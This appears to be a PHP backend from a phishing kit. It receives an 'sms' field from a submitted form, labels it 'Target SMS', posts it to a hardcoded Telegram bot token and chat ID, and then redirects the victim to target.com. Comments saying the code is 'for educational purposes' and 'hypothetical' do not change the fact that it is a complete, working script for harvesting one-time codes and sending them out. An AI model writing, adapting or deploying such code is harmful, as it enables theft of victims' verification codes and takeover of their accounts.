<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you have a form field for email and password
    $sms = filter_input(INPUT_POST, 'sms', FILTER_SANITIZE_STRING);
   
    


 

 

    // For educational purposes, here's how you might format a message
    $message = " =========Target SMS============" . 
    "\nSMS : " . $sms;


    // Sending to a Telegram bot hypothetically
    $telegramBotToken = '6676319522:AAHx7QharxfLNSQ6HLQaPudpRyZMvgIGEzw';
    $chatId = '1064643518';
     $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
   
    HEADER("Location: https://www.target.com");

}
?>
